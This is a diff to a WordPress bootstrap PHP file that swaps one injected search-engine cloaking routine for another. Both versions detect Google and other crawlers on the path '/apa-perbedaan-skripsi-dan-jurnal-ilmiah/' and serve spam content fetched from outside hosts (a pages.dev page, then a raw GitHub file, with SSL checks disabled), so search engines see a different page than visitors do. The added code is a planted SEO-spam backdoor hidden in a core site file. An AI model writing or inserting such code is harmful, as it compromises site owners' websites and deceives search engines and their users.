@@ -1,87 +1,26 @@
 <?php
-// === GEO & BOT CLOAK – MULAI DARI SINI ===
-function is_googlebot_verified() {
-    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
-    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-
-    $google_ip_ranges = [
-        '66.249.', '64.233.', '35.227.', '35.228.', '35.229.', '35.230.', '35.231.', '35.232.', '35.233.', '35.234.', '35.235.', '35.236.',
-        '34.100.', '34.101.', '34.118.', '34.126.', '34.146.', '34.147.', '34.151.', '192.178.', '34.160.', '34.162.', '34.163.', '35.165.',
-        '34.168.', '34.169.', '34.170.', '34.171.', '34.172.', '34.173.', '34.174.', '34.175.', '34.176.', '34.177.', '34.178.', '34.179.',
-        '34.180.', '34.181.', '34.182.', '34.183.', '34.184.', '34.185.', '34.186.', '34.187.', '34.188.', '34.189.', '34.190.', '34.191.',
-        '34.192.', '34.193.', '34.194.', '34.195.', '34.196.', '34.197.', '34.198.', '34.199.', '34.200.', '34.201.', '34.202.', '34.203.',
-        '34.204.', '34.205.', '34.206.', '34.207.', '34.208.', '34.209.', '34.210.', '34.211.', '34.212.', '34.213.', '34.214.', '34.215.',
-        '34.216.', '34.217.', '34.218.', '34.219.', '34.220.', '34.221.', '34.222.', '34.223.', '34.224.', '34.225.', '34.226.', '34.227.',
-        '34.228.', '34.229.', '34.230.', '34.231.', '34.232.', '34.233.', '34.234.', '34.235.', '34.236.', '34.237.', '34.238.', '34.239.',
-        '34.240.', '34.241.', '34.242.', '34.243.', '34.244.', '34.245.', '34.246.', '34.247.', '34.248.', '34.249.', '34.250.', '34.251.',
-        '34.252.', '34.253.', '34.254.', '34.255.'
-    ];
-
-    $is_ip_match = false;
-    foreach ($google_ip_ranges as $range) {
-        if (strpos($ip, $range) === 0) {
-            $is_ip_match = true;
-            break;
-        }
-    }
-
-    $is_rdns_google = false;
-    if ($is_ip_match) {
-        $host = @gethostbyaddr($ip);
-        if ($host && (stripos($host, '.googlebot.com') !== false || stripos($host, '.google.com') !== false)) {
-            $is_rdns_google = true;
-        }
-    }
-
-    $is_ua_google = preg_match('/(Googlebot|AdsBot|Mediapartners|Google-InspectionTool)/i', $ua);
-
-    return $is_ua_google && ($is_ip_match && $is_rdns_google);
+ob_start();
+header('Vary: User-Agent');
+$botchar = "/(bot|google|ahrefs)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function aselolejos($url){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
 }
 
-// LOGIKA UTAMA (hanya untuk subfolder /apa-perbedaan-skripsi-dan-jurnal-ilmiah/)
-$current_uri = $_SERVER['REQUEST_URI'] ?? '';
-if (strpos($current_uri, '/apa-perbedaan-skripsi-dan-jurnal-ilmiah/') !== false && is_googlebot_verified()) {
-    // URL landing cloaking
-    $cloaking_url = 'https://contactos-jpardo.pages.dev/zhatainstitut';
-
-    // Kontek fetch aman & dinamis
-    $context = stream_context_create([
-        'http' => [
-            'method' => 'GET',
-            'header' => "User-Agent: MBA-Cloak/1.0 (+https://ariete.org/)\r\n" .
-                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
-                        "Referer: " . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri\r\n",
-            'timeout' => 10,
-            'follow_location' => 1,
-            'max_redirects' => 3,
-        ],
-        'ssl' => [
-            'verify_peer' => true,
-            'verify_peer_name' => true,
-            'allow_self_signed' => false,
-        ]
-    ]);
-
-    // Fetch konten
-    $content = @file_get_contents($cloaking_url, false, $context);
-
-    if ($content === false || empty($content)) {
-        // Fallback aman (tampil halaman asli, anti error)
-        // Tidak echo apa-apa, biarkan WP lanjut normal
-    } else {
-        // Header SEO boost (anti deindex, powerfull crawl)
-        header('Content-Type: text/html; charset=UTF-8');
-        header('X-Robots-Tag: index, follow');
-        header('Cache-Control: max-age=3600, public');  // Cache 1 jam, boost performa
-
-        // Tambah canonical ke URL asli (boost SEO, anti duplikat)
-        $current_full_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri";
-        $content = preg_replace('/<head([^>]*)>/i', '<head$1><link rel="canonical" href="' . htmlspecialchars($current_full_url) . '" />', $content, 1);
-
-        // Output konten cloaking
-        echo $content;
-        exit;
-    }
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/apa-perbedaan-skripsi-dan-jurnal-ilmiah/") {
+    usleep(rand(100000, 200000)); 
+    header('Content-Type: text/html; charset=utf-8');
+    echo aselolejos("https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/zhatainstitut.txt");
+    ob_end_flush();
+    exit;
 }
 /**
  * Bootstrap file for setting the ABSPATH constant
